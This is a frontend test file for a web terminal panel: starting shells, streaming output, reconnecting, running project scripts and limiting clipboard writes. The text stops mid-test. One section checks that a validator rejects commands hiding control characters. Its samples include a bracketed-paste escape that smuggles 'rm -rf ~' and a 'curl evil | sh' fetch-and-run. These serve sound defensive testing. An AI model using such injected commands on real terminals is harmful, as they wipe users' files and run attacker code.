// SPDX-FileCopyrightText: 2026 Olivares.AI
// SPDX-License-Identifier: AGPL-3.0-only
// Additional terms under AGPL-3.0-only section 7(a) disclaim warranty and limit liability: see DISCLAIMER.md at the repository root.
//
// The terminals of a folder: they start nothing until a person asks, hand the window size
// to the server, carry what is typed and what is printed, end cleanly, and outlive the view
// that shows them. xterm.js draws into a real browser's layout, which jsdom does not have, so
// a recording double stands in for it; the panel, the terminal store and the stream parser
// are the production ones.
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { render as renderUi, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { act, type ReactElement } from 'react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const xterm = vi.hoisted(() => {
  interface Fake {
    rows: number
    cols: number
    written: string[]
    textarea: HTMLTextAreaElement
    disposed: boolean
    data: ((d: string) => void)[]
    resized: ((s: { rows: number; cols: number }) => void)[]
    options: Record<string, unknown>
    selected: (() => void)[]
    selection: string
    keys: ((e: KeyboardEvent) => boolean)[]
    lines: string[]
    allSelected: boolean
    scrolled: string
    linkProviders: {
      provideLinks: (
        y: number,
        cb: (
          links: { text: string; activate: () => void }[] | undefined,
        ) => void,
      ) => void
    }[]
  }
  // The clipboard providers the screens were given: what a program's OSC 52 reaches.
  const clipboard: { writeText: (s: string, t: string) => Promise<void> }[] = []
  // What the link addon of each screen does with an address a person clicks.
  const webLinks: ((event: MouseEvent, uri: string) => void)[] = []
  return { terms: [] as Fake[], clipboard, webLinks }
})

vi.mock('@xterm/xterm', () => {
  class Terminal {
    rows = 30
    cols = 100
    written: string[] = []
    textarea = document.createElement('textarea')
    disposed = false
    data: ((d: string) => void)[] = []
    resized: ((s: { rows: number; cols: number }) => void)[] = []
    options: Record<string, unknown> = {}
    unicode = { activeVersion: '6' }
    selected: (() => void)[] = []
    selection = ''
    keys: ((e: KeyboardEvent) => boolean)[] = []
    lines: string[] = []
    linkProviders: {
      provideLinks: (
        y: number,
        cb: (l: { text: string; activate: () => void }[] | undefined) => void,
      ) => void
    }[] = []
    opened = false
    allSelected = false
    scrolled = ''
    selectAll() {
      this.allSelected = true
    }
    scrollToTop() {
      this.scrolled = 'top'
    }
    scrollToBottom() {
      this.scrolled = 'bottom'
    }
    constructor(options: Record<string, unknown>) {
      this.options = options
      xterm.terms.push(this)
    }
    loadAddon() {}
    open(el: HTMLElement) {
      this.opened = true
      el.appendChild(this.textarea)
    }
    registerLinkProvider(p: (typeof this.linkProviders)[number]) {
      this.linkProviders.push(p)
      return { dispose() {} }
    }
    get buffer() {
      return {
        active: {
          viewportY: 0,
          getLine: (y: number) =>
            this.lines[y] === undefined
              ? undefined
              : { translateToString: () => this.lines[y] },
        },
      }
    }
    focus() {}
    // A screen parses later, and answers a device query (ESC [ c) as typed input.
    write(bytes: Uint8Array, done?: () => void) {
      const text = new TextDecoder().decode(bytes)
      this.written.push(text)
      queueMicrotask(() => {
        if (text.includes('\x1b[c')) this.data.forEach((cb) => cb('\x1b[?1;2c'))
        done?.()
      })
    }
    // A paste reaches the shell as typed input, as a real screen sends it. A screen that
    // was never opened has no textarea to paste through and throws.
    paste(text: string) {
      if (!this.opened) throw new TypeError('no textarea')
      this.data.forEach((cb) => cb(text))
    }
    attachCustomKeyEventHandler(cb: (e: KeyboardEvent) => boolean) {
      this.keys.push(cb)
    }
    hasSelection() {
      return this.selection !== ''
    }
    getSelection() {
      return this.selection
    }
    onData(cb: (d: string) => void) {
      this.data.push(cb)
      return { dispose() {} }
    }
    onResize(cb: (s: { rows: number; cols: number }) => void) {
      this.resized.push(cb)
      return { dispose() {} }
    }
    onSelectionChange(cb: () => void) {
      this.selected.push(cb)
      return { dispose() {} }
    }
    dispose() {
      this.disposed = true
    }
  }
  return { Terminal }
})
vi.mock('@xterm/addon-fit', () => ({
  FitAddon: class {
    fit() {}
  },
}))
vi.mock('@xterm/addon-search', () => ({
  SearchAddon: class {
    findNext() {
      return true
    }
    findPrevious() {
      return true
    }
    clearDecorations() {}
  },
}))
vi.mock('@xterm/addon-web-links', () => ({
  WebLinksAddon: class {
    constructor(handler: (event: MouseEvent, uri: string) => void) {
      xterm.webLinks.push(handler)
    }
  },
}))
vi.mock('@xterm/addon-unicode11', () => ({ Unicode11Addon: class {} }))
vi.mock('@xterm/addon-clipboard', () => ({
  ClipboardAddon: class {
    constructor(
      _base: unknown,
      provider: { writeText: (s: string, t: string) => Promise<void> },
    ) {
      xterm.clipboard.push(provider)
    }
  },
}))
vi.mock('@xterm/addon-webgl', () => ({
  WebglAddon: class {
    onContextLoss() {}
    dispose() {}
  },
}))
vi.mock('@xterm/xterm/css/xterm.css', () => ({}))
// The person the terminals belong to: their list is kept for them in this browser.
vi.mock('@/lib/auth/context', () => ({
  useAuth: () => ({ principal: { kind: 'user', user_id: 'u1' } }),
}))
vi.mock('@/features/agentops/api', async (orig) => ({
  ...(await orig<typeof import('@/features/agentops/api')>()),
  agentOpsApi: {
    listFiles: vi.fn(),
    readFile: vi.fn(),
    startTerminal: vi.fn(),
    listTerminals: vi.fn(),
    terminalInput: vi.fn(),
    terminalSize: vi.fn(),
    closeTerminal: vi.fn(),
  },
}))

import { agentOpsApi, agentOpsKeys } from '@/features/agentops/api'
import i18n from '@/lib/i18n'
import { ApiError } from '@/lib/api/errors'
import { useClientSettings } from '@/features/settings/preferences'
import { MarkdownText } from './markdown-text'
import { RunInTerminalContext } from './run-in-terminal'
import {
  SessionTerminal,
  TerminalPanel,
  useTerminalGroup,
} from './session-terminal'
import { unsafeCommand } from './run-in-terminal'
import { clipboardWriteAllowed, resetTerminalGroups } from './terminal-store'
import { linksIn } from './terminal-links'

// The panel reads the folder's scripts through the query cache, like Details.
function render(ui: ReactElement) {
  const client = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })
  return renderUi(ui, {
    wrapper: ({ children }) => (
      <QueryClientProvider client={client}>{children}</QueryClientProvider>
    ),
  })
}

// The names at the top of the folder, as the engine lists them.
const projectFiles = (...names: string[]) =>
  vi.mocked(agentOpsApi.listFiles).mockResolvedValue({
    path: '',
    entries: names.map((name) => ({
      name,
      path: name,
      type: 'file',
      size: 1,
      mode: '-rw-r--r--',
      mtime: '2026-11-10T00:00:00Z',
    })),
    has_more: false,
  })

let push: (text: string) => void = () => {}
let end: () => void = () => {}
let streams = 0
let started = 0
// The open streams by terminal id: several terminals are read at once.
const feeds = new Map<string, { push: (t: string) => void; end: () => void }>()
let nextStatus: number[] = []

beforeEach(() => {
  vi.clearAllMocks()
  window.localStorage.clear()
  xterm.terms.length = 0
  xterm.clipboard.length = 0
  xterm.webLinks.length = 0
  streams = 0
  started = 0
  feeds.clear()
  resetTerminalGroups()
  nextStatus = []
  vi.spyOn(globalThis, 'fetch').mockImplementation((async (
    input: RequestInfo | URL,
  ) => {
    // Only the terminal's stream stays open; anything else (a language dictionary) answers.
    if (!String(input).includes('/terminals/'))
      return new Response('{}', {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      })
    const status = nextStatus.shift() ?? 200
    if (status !== 200) return new Response('{}', { status })
    streams++
    const enc = new TextEncoder()
    let controller!: ReadableStreamDefaultController<Uint8Array>
    const body = new ReadableStream<Uint8Array>({
      start(c) {
        controller = c
      },
    })
    push = (text) => controller.enqueue(enc.encode(text))
    end = () => controller.close()
    const id = /\/terminals\/([^/]+)\/stream/.exec(String(input))?.[1] ?? ''
    feeds.set(id, { push, end })
    return new Response(body, {
      status: 200,
      headers: { 'Content-Type': 'text/event-stream' },
    })
  }) as typeof fetch)
  projectFiles()
  vi.mocked(agentOpsApi.readFile).mockRejectedValue(
    new ApiError(404, 'not_found', 'absent'),
  )
  vi.mocked(agentOpsApi.startTerminal).mockImplementation(async () => ({
    terminal: `term_${++started}`,
    confinement: 'landlock',
    idle_seconds: 0,
    reconnect_seconds: 0,
  }))
  vi.mocked(agentOpsApi.listTerminals).mockResolvedValue({ items: [] })
  vi.mocked(agentOpsApi.terminalInput).mockResolvedValue({})
  vi.mocked(agentOpsApi.terminalSize).mockResolvedValue({})
  vi.mocked(agentOpsApi.closeTerminal).mockResolvedValue({ closed: true })
})

afterEach(() => {
  vi.restoreAllMocks()
})

const rememberTerminals = (ids: string[]) =>
  window.localStorage.setItem(
    `olivares.terminals.v2.${JSON.stringify([JSON.stringify(['user', 'u1']), '', 'ws_1'])}`,
    JSON.stringify({
      items: ids.map((id, i) => ({ id, title: `Terminal ${i + 1}` })),
      active: 0,
    }),
  )

const frame = (o: number, text: string) =>
  `event: out\ndata: {"o":${o},"d":"${btoa(text)}"}\n\n`

async function openIt() {
  const user = userEvent.setup()
  render(<SessionTerminal workspaceRef="ws_1" />)
  await user.click(screen.getByRole('button', { name: 'Open terminal' }))
  await waitFor(() => expect(streams).toBe(1))
  return user
}

describe('SessionTerminal', () => {
  it('starts nothing until a person asks', () => {
    render(<SessionTerminal workspaceRef="ws_1" />)
    const open = screen.getByRole('button', { name: 'Open terminal' })
    // The empty tab is its one action; what the shell is, is that action's hover.
    expect(screen.getByTestId('session-terminal').textContent).toBe(
      'Open terminal',
    )
    expect(open).toHaveAttribute(
      'title',
      expect.stringContaining('each command line you type is recorded'),
    )
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    expect(streams).toBe(0)
    expect(xterm.terms).toHaveLength(0)
  })

  it('opens a shell at the size the screen has and prints what the shell prints', async () => {
    await openIt()
    expect(agentOpsApi.startTerminal).toHaveBeenCalledWith('ws_1', {
      rows: 30,
      cols: 100,
    })
    act(() => push(frame(0, 'olivares:~$ ')))
    await waitFor(() =>
      expect(xterm.terms[0].written).toEqual(['olivares:~$ ']),
    )
    expect(screen.getByRole('group', { name: 'Terminal' })).toBeInTheDocument()
  })

  it('names the input for a screen reader', async () => {
    await openIt()
    expect(xterm.terms[0].textarea.getAttribute('aria-label')).toBe(
      'Terminal input',
    )
  })

  it('carries what is typed to the shell and the window size when it changes', async () => {
    await openIt()
    act(() => xterm.terms[0].data.forEach((cb) => cb('git status\r')))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        'git status\r',
      ),
    )
    act(() =>
      xterm.terms[0].resized.forEach((cb) => cb({ rows: 12, cols: 40 })),
    )
    await waitFor(() =>
      expect(agentOpsApi.terminalSize).toHaveBeenCalledWith('ws_1', 'term_1', {
        rows: 12,
        cols: 40,
      }),
    )
  })

  it('gives a touch keyboard the keys it lacks', async () => {
    const user = await openIt()
    await user.click(screen.getByRole('button', { name: 'Ctrl+C' }))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        '\x03',
      ),
    )
  })

  it('asks before it closes a running shell, then ends it and returns to the idle panel', async () => {
    const user = await openIt()
    await user.click(screen.getByRole('button', { name: 'Close Terminal 1' }))
    // Nothing is ended until the person confirms.
    expect(agentOpsApi.closeTerminal).not.toHaveBeenCalled()
    await user.click(screen.getByRole('button', { name: 'Close terminal' }))
    expect(agentOpsApi.closeTerminal).toHaveBeenCalledWith('ws_1', 'term_1')
    expect(
      await screen.findByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
    expect(xterm.terms[0].disposed).toBe(true)
  })

  it('says the shell ended and offers a new one', async () => {
    const user = await openIt()
    act(() => push('event: exit\ndata: {"code":0}\n\n'))
    expect(
      await screen.findByText('The terminal ended (exit 0).'),
    ).toBeInTheDocument()
    // An ended terminal closes without asking.
    await user.click(screen.getByRole('button', { name: 'Close Terminal 1' }))
    expect(agentOpsApi.closeTerminal).not.toHaveBeenCalled()
    expect(
      await screen.findByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
  })

  it('says why a terminal was not opened and keeps the way to try again', async () => {
    vi.mocked(agentOpsApi.startTerminal).mockRejectedValueOnce(
      new ApiError(403, 'step_up_required', 'confirm'),
    )
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    expect(await screen.findByRole('alert')).toHaveTextContent(
      'Confirm your identity first, then open the terminal again.',
    )
    expect(
      screen.getByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
    expect(streams).toBe(0)
    // Asking again after the person has confirmed their identity opens the shell.
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(2)
    expect(screen.queryByRole('alert')).toBeNull()
  })

  it('returns to the idle panel, quietly, when the shell it remembers is gone', async () => {
    rememberTerminals(['term_gone'])
    nextStatus = [404]
    render(<SessionTerminal workspaceRef="ws_1" />)
    expect(
      await screen.findByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
    expect(screen.queryByText(/ended/i)).toBeNull()
    expect(screen.queryByRole('alert')).toBeNull()
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
  })

  it('follows a change of language without restarting the terminal or opening another', async () => {
    await openIt()
    expect(xterm.terms[0].textarea.getAttribute('aria-label')).toBe(
      'Terminal input',
    )
    await act(() => i18n.changeLanguage('es'))
    try {
      await waitFor(() =>
        expect(xterm.terms[0].textarea.getAttribute('aria-label')).toBe(
          i18n.getFixedT('es', 'sessions')('terminal.input'),
        ),
      )
      expect(xterm.terms).toHaveLength(1)
      expect(xterm.terms[0].disposed).toBe(false)
      expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(1)
    } finally {
      await act(() => i18n.changeLanguage('en'))
    }
  })

  it('takes back the shell this browser had before a reload without a click', async () => {
    rememberTerminals(['term_7'])
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(1))
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    act(() => push(frame(0, 'still here')))
    await waitFor(() => expect(xterm.terms[0].written).toEqual(['still here']))
    act(() => end())
  })

  // The server keeps a shell until it is closed, so the view keeps asking for it: three
  // minutes without a connection (the limit was one) end nothing, and the stream resumes.
  it('keeps asking for a shell the server still holds, however long the connection stays down', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    try {
      rememberTerminals(['term_9'])
      nextStatus = Array<number>(100).fill(503)
      render(<SessionTerminal workspaceRef="ws_1" />)
      await act(() => vi.advanceTimersByTimeAsync(180_000))
      expect(screen.queryByText(/ended/i)).toBeNull()
      expect(screen.getByRole('status')).toHaveTextContent('Reconnecting')
      nextStatus = []
      await act(() => vi.advanceTimersByTimeAsync(6_000))
      expect(streams).toBe(1)
      expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    } finally {
      vi.useRealTimers()
    }
  })
})

describe('the terminals outlive the view', () => {
  it('finds the same screen, scrollback and stream when the view comes back', async () => {
    const user = userEvent.setup()
    const first = render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    act(() => push(frame(0, 'build ok\r\n')))
    await waitFor(() =>
      expect(xterm.terms[0].written).toEqual(['build ok\r\n']),
    )

    // Another session is shown; this one's view is gone.
    first.unmount()
    expect(xterm.terms[0].disposed).toBe(false)

    // Output keeps arriving while nobody looks at it.
    act(() => push(frame(10, 'while away\r\n')))
    render(<SessionTerminal workspaceRef="ws_1" />)
    await screen.findByRole('tab', { name: 'Terminal 1' })
    await waitFor(() =>
      expect(xterm.terms[0].written).toEqual([
        'build ok\r\n',
        'while away\r\n',
      ]),
    )
    // Nothing was started again: one shell, one screen, one stream.
    expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(1)
    expect(xterm.terms).toHaveLength(1)
    expect(streams).toBe(1)
    expect(agentOpsApi.closeTerminal).not.toHaveBeenCalled()
  })

  it('keeps three terminals at once, each with its own stream, and closes one alone', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    await user.click(screen.getByRole('button', { name: 'New terminal' }))
    await waitFor(() => expect(streams).toBe(2))
    await user.click(screen.getByRole('button', { name: 'New terminal' }))
    await waitFor(() => expect(streams).toBe(3))
    expect(screen.getAllByRole('tab')).toHaveLength(3)
    expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(3)

    // Each stream prints on its own screen.
    act(() => feeds.get('term_2')!.push(frame(0, 'second')))
    await waitFor(() => expect(xterm.terms[1].written).toEqual(['second']))
    expect(xterm.terms[0].written).toEqual([])

    await user.click(screen.getByRole('tab', { name: 'Terminal 2' }))
    await user.click(screen.getByRole('button', { name: 'Close Terminal 2' }))
    await user.click(screen.getByRole('button', { name: 'Close terminal' }))
    expect(agentOpsApi.closeTerminal).toHaveBeenCalledTimes(1)
    expect(agentOpsApi.closeTerminal).toHaveBeenCalledWith('ws_1', 'term_2')
    expect(screen.getAllByRole('tab')).toHaveLength(2)
    expect(xterm.terms[0].disposed).toBe(false)
    expect(xterm.terms[2].disposed).toBe(false)
  })

  it('splits to show a second terminal beside the first, and renames a terminal', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    expect(screen.getAllByTestId('terminal-screen')).toHaveLength(1)
    await user.click(screen.getByRole('button', { name: 'Split' }))
    await waitFor(() => expect(streams).toBe(2))
    await waitFor(() =>
      expect(screen.getAllByTestId('terminal-screen')).toHaveLength(2),
    )
    await user.click(screen.getByRole('button', { name: 'Close split' }))
    await waitFor(() =>
      expect(screen.getAllByTestId('terminal-screen')).toHaveLength(1),
    )

    await user.dblClick(screen.getByRole('tab', { name: 'Terminal 2' }))
    const name = screen.getByRole('textbox', { name: 'Rename terminal' })
    await user.clear(name)
    await user.type(name, 'server{Enter}')
    expect(
      await screen.findByRole('tab', { name: 'server' }),
    ).toBeInTheDocument()
  })

  it('remembers the terminals of this browser across a reload and resumes each without starting one', async () => {
    rememberTerminals(['term_a', 'term_b', 'term_c'])
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(3))
    expect(screen.getAllByRole('tab')).toHaveLength(3)
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    expect(Array.from(feeds.keys()).sort()).toEqual([
      'term_a',
      'term_b',
      'term_c',
    ])
  })
})

describe('a command a person chose to run', () => {
  it('runs in a new terminal once it is live, and in the open one when there is one', async () => {
    const user = userEvent.setup()
    projectFiles('package.json')
    vi.mocked(agentOpsApi.readFile).mockImplementation(async (_ref, path) => {
      if (path !== 'package.json')
        throw new ApiError(404, 'not_found', 'absent')
      return {
        path,
        size: 60,
        encoding: 'utf-8',
        content: JSON.stringify({ scripts: { dev: 'vite', test: 'vitest' } }),
      }
    })
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(await screen.findByRole('button', { name: 'Run dev' }))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        "npm run -- 'dev'\r",
      ),
    )
    // The second command goes to the terminal that is open, not to a third one.
    await user.click(screen.getByRole('button', { name: 'Terminal actions' }))
    await user.click(await screen.findByRole('menuitem', { name: /Run test/ }))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        "npm run -- 'test'\r",
      ),
    )
    expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(1)
  })
})

describe('Run in terminal on a code block of the conversation', () => {
  const reply = '```sh\nnpm test\n```\n\n```ts\nconst x = 1\n```'

  it('runs a shell block in the session terminal, and offers it on no other block', async () => {
    const user = userEvent.setup()
    const run = vi.fn()
    render(
      <RunInTerminalContext.Provider value={{ run }}>
        <MarkdownText text={reply} />
      </RunInTerminalContext.Provider>,
    )
    const buttons = screen.getAllByRole('button', { name: 'Run in terminal' })
    expect(buttons).toHaveLength(1) // the ts block has none
    await user.click(buttons[0]!)
    expect(run).toHaveBeenCalledWith('npm test')
  })

  it('offers nothing where the session has no terminal', () => {
    render(<MarkdownText text={reply} />)
    expect(screen.queryByRole('button', { name: 'Run in terminal' })).toBeNull()
  })
})

describe('terminal output for the agent', () => {
  it('offers the selected output with the terminal name, and only when something is selected', async () => {
    const user = userEvent.setup()
    const onSendToAgent = vi.fn()
    render(
      <SessionTerminal workspaceRef="ws_1" onSendToAgent={onSendToAgent} />,
    )
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    const actions = screen.getByRole('button', { name: 'Terminal actions' })
    await user.click(actions)
    expect(
      await screen.findByRole('menuitem', { name: 'Send to agent' }),
    ).toHaveAttribute('aria-disabled', 'true')
    await user.keyboard('{Escape}')
    act(() => {
      xterm.terms[0].selection = 'FAIL: 2 tests'
      xterm.terms[0].selected.forEach((cb) => cb())
    })
    await user.click(actions)
    await user.click(
      await screen.findByRole('menuitem', { name: 'Send to agent' }),
    )
    expect(onSendToAgent).toHaveBeenCalledWith('FAIL: 2 tests', 'Terminal 1')
  })

  it('offers nothing to send where the host cannot carry it', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    await user.click(screen.getByRole('button', { name: 'Terminal actions' }))
    await screen.findByRole('menuitem', { name: 'Copy' })
    expect(screen.queryByRole('menuitem', { name: 'Send to agent' })).toBeNull()
  })
})

describe('the actions of a terminal', () => {
  it('opens on a right-click of the screen, with no text buttons around it', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" onSendToAgent={vi.fn()} />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    expect(screen.queryByRole('button', { name: 'Copy' })).toBeNull()
    expect(screen.queryByRole('button', { name: 'Paste' })).toBeNull()
    await user.pointer({
      keys: '[MouseRight]',
      target: screen.getByTestId('terminal-screen'),
    })
    for (const name of [
      'Send to agent',
      'Copy',
      'Paste',
      'Select all',
      'Jump to latest',
    ])
      expect(await screen.findByRole('menuitem', { name })).toBeVisible()
    await user.click(screen.getByRole('menuitem', { name: 'Stop' }))
    expect(agentOpsApi.terminalInput).toHaveBeenLastCalledWith(
      'ws_1',
      'term_1',
      '\x03',
    )
  })
})

it('asks only for the declaration files the folder holds', async () => {
  projectFiles('package.json', 'README.md')
  vi.mocked(agentOpsApi.readFile).mockImplementation(async (_ref, path) => ({
    path,
    size: 60,
    encoding: 'utf-8',
    content: JSON.stringify({ scripts: { dev: 'vite' } }),
  }))
  render(<SessionTerminal workspaceRef="ws_1" />)
  expect(await screen.findByRole('button', { name: 'Run dev' })).toBeVisible()
  // No Taskfile and no makefile here: none is asked for, so none answers 404.
  expect(
    vi.mocked(agentOpsApi.readFile).mock.calls.map((call) => call[1]),
  ).toEqual(['package.json'])
})

it('reads the scripts Details already read, from the one entry they share', async () => {
  const client = new QueryClient({
    defaultOptions: { queries: { retry: false, staleTime: Infinity } },
  })
  // What Details' scripts left in the cache for this folder.
  client.setQueryData(
    [...agentOpsKeys.files(null, 'ws_1', ''), 'scripts'],
    [{ name: 'dev', source: 'package.json', command: "npm run -- 'dev'" }],
  )
  render(
    <QueryClientProvider client={client}>
      <SessionTerminal workspaceRef="ws_1" />
    </QueryClientProvider>,
  )
  expect(await screen.findByRole('button', { name: 'Run dev' })).toBeVisible()
  // The folder is not listed or read a second time.
  expect(agentOpsApi.listFiles).not.toHaveBeenCalled()
  expect(agentOpsApi.readFile).not.toHaveBeenCalled()
})

describe('a script a person added to the project', () => {
  afterEach(() => useClientSettings.setState({ projectScripts: {} }))
  // A session's terminal opens in its own folder; what is added is kept by its project.
  function Hosted() {
    const group = useTerminalGroup('ws_1')
    return <TerminalPanel group={group} projectRef="proj_1" />
  }

  it('is in the Run menu of a terminal of that project and runs as typed, on a click', async () => {
    useClientSettings.setState({
      projectScripts: {
        proj_1: [{ name: 'serve', command: 'python3 -m http.server' }],
      },
    })
    const user = userEvent.setup()
    render(<Hosted />)
    const run = await screen.findByRole('button', { name: 'Run serve' })
    expect(run).toHaveAttribute('title', 'python3 -m http.server')
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    await user.click(run)
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        'python3 -m http.server\r',
      ),
    )
  })
})

it('runs a declared test script in the session terminal and shows its output', async () => {
  projectFiles('package.json')
  vi.mocked(agentOpsApi.readFile).mockImplementation(async (_ref, path) => {
    if (path !== 'package.json') throw new ApiError(404, 'not_found', 'absent')
    return {
      path,
      size: 60,
      encoding: 'utf-8',
      content: JSON.stringify({ scripts: { test: 'printf script-passed' } }),
    }
  })
  const user = userEvent.setup()
  render(<SessionTerminal workspaceRef="ws_1" />)
  const run = await screen.findByRole('button', { name: 'Run test' })
  expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
  await user.click(run)
  await waitFor(() =>
    expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
      'ws_1',
      'term_1',
      "npm run -- 'test'\r",
    ),
  )
  // The line is cleared first, so the command never joins what was typed before it.
  expect(agentOpsApi.terminalInput).toHaveBeenNthCalledWith(
    1,
    'ws_1',
    'term_1',
    '\x15',
  )
  act(() => push(frame(0, 'script-passed')))
  await waitFor(() => expect(xterm.terms[0].written).toContain('script-passed'))
  await user.click(screen.getByRole('button', { name: 'Terminal actions' }))
  await user.click(await screen.findByRole('menuitem', { name: 'Stop' }))
  expect(agentOpsApi.terminalInput).toHaveBeenLastCalledWith(
    'ws_1',
    'term_1',
    '\x03',
  )
})

const held = (...ids: string[]) => ({
  items: ids.map((terminal) => ({
    terminal,
    confinement: 'landlock',
    started_at: '2026-11-09T12:00:00Z',
  })),
})

describe('terminals this browser lost the ids of', () => {
  it('takes back what the server holds for this person, without starting a shell', async () => {
    vi.mocked(agentOpsApi.listTerminals).mockResolvedValue(
      held('term_x', 'term_y'),
    )
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(2))
    expect(screen.getAllByRole('tab')).toHaveLength(2)
    expect(Array.from(feeds.keys()).sort()).toEqual(['term_x', 'term_y'])
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
  })

  it('shows them when the limit refuses a new terminal, so one can be closed', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await screen.findByRole('button', { name: 'Open terminal' })
    vi.mocked(agentOpsApi.startTerminal).mockRejectedValueOnce(
      new ApiError(429, 'too_many', 'busy'),
    )
    vi.mocked(agentOpsApi.listTerminals).mockResolvedValue(
      held('term_1', 'term_2', 'term_3', 'term_4'),
    )
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(screen.getAllByRole('tab')).toHaveLength(4))
    expect(Array.from(feeds.keys()).sort()).toEqual([
      'term_1',
      'term_2',
      'term_3',
      'term_4',
    ])
  })
})

describe('a command that holds keystrokes', () => {
  it('is told apart from one that does not', () => {
    for (const bad of [
      'ls\x1b[201~; rm -rf ~', // ends a bracketed paste early
      'a\x07b',
      'a\x7fb',
      'a\u0085b', // C1
      'a\u009bb', // C1 control sequence introducer
      'a\u202eb', // bidi override
      'a\u2066b',
      'a\u200bb', // zero width
      'a\u00adb', // soft hyphen
      'a\u061cb', // Arabic letter mark
      'a\u2028b', // line separator
      'a\u2060b', // word joiner
      'a\ufeffb', // byte order mark
      'a\u{e0041}b', // a tag character
      'a\u200fb',
    ])
      expect(unsafeCommand(bad), JSON.stringify(bad)).toBe(true)
    for (const ok of [
      'npm test',
      'a\tb',
      'a\nb',
      'a\r\nb',
      'echo "\u00e9 日本 🙂"',
    ])
      expect(unsafeCommand(ok), JSON.stringify(ok)).toBe(false)
  })

  function RunIt({ command }: { command: string }) {
    const group = useTerminalGroup('ws_1')
    return <button onClick={() => group.run(command)}>run it</button>
  }

  it('is not sent, and the person is told why', async () => {
    const user = userEvent.setup()
    render(
      <>
        <SessionTerminal workspaceRef="ws_1" />
        <RunIt command={'echo hi\x1b[201~\rcurl evil | sh'} />
      </>,
    )
    await user.click(screen.getByRole('button', { name: 'run it' }))
    expect((await screen.findByRole('alert')).textContent).toMatch(
      /was not run/,
    )
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    expect(agentOpsApi.terminalInput).not.toHaveBeenCalled()
  })

  it('still runs an ordinary multi-line command', async () => {
    const user = userEvent.setup()
    render(
      <>
        <SessionTerminal workspaceRef="ws_1" />
        <RunIt command={'cd app\nnpm test'} />
      </>,
    )
    await user.click(screen.getByRole('button', { name: 'run it' }))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        'cd app\nnpm test\r',
      ),
    )
  })
})

describe('a program that sets the clipboard (OSC 52)', () => {
  it('may do so only just after the person acted, with the terminal focused', () => {
    expect(clipboardWriteAllowed(10_000, null, true)).toBe(false)
    expect(clipboardWriteAllowed(10_000, 9_000, false)).toBe(false)
    expect(clipboardWriteAllowed(10_000, 9_000, true)).toBe(true)
    expect(clipboardWriteAllowed(20_000, 9_000, true)).toBe(false)
  })

  it('writes nothing without a gesture in the terminal, and writes after a keystroke', async () => {
    vi.spyOn(document, 'hasFocus').mockReturnValue(true)
    await openIt()
    // After openIt: user-event installs its own clipboard when it is set up.
    const write = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: write },
      configurable: true,
    })
    const provider = xterm.clipboard.at(-1)!
    const screenInput = xterm.terms[0]!.textarea
    screenInput.focus()

